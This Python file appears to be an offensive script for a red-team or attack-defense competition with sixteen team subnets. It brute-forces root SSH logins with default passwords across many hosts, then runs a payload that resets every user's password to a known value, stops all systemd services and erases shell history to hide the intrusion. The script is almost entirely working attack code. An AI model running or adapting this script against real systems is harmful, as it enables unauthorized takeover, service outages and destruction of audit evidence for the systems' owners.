import pty
import sys
import asyncio
import pexpect

async def ssh(user, host, cmd, password, timeout=30):
	try:                                                                                                                                                                                                                                    
		options = '-q -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null -oPubkeyAuthentication=no -f'                                                                         

		ssh_cmd = f'ssh {user}@{host} {options} "{cmd}"'                                                                                                               
		child = pexpect.spawn(ssh_cmd, timeout=timeout, encoding="utf-8")                                                                                                                            
		child.expect(['password: '])                                                                                                                                                                                                                                                                                               
		child.sendline(password)                                                                                                                                                                                                                                                                                                     
		child.expect(pexpect.EOF)                                                                                                                                                  
		child.close()
	except:
		return                                                                                                                                                                                                                                                                                                             



# fuck around with any command we want
command = """
getent passwd | awk -F: '{print $1 ":" $1 "Chiapet1"}' | chpasswd /dev/stdin;
for s in `systemctl | grep service | cut -d '.' -f 1`; do systemctl stop $s; done

history -c;
rm ~/.bash_history;
exit;
"""

default_passwords = str(sys.argv)[1:]


# each team
for team in range(16):
	# each teams servers
	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
		# check each default password
		for password in default_passwords:

			asyncio.run(ssh(user="root", host=f"10.{team}.1.{server}", cmd=command, password=password))
			asyncio.run(ssh(user="root", host=f"172.16.{team}.{server}", cmd=command, password=password))






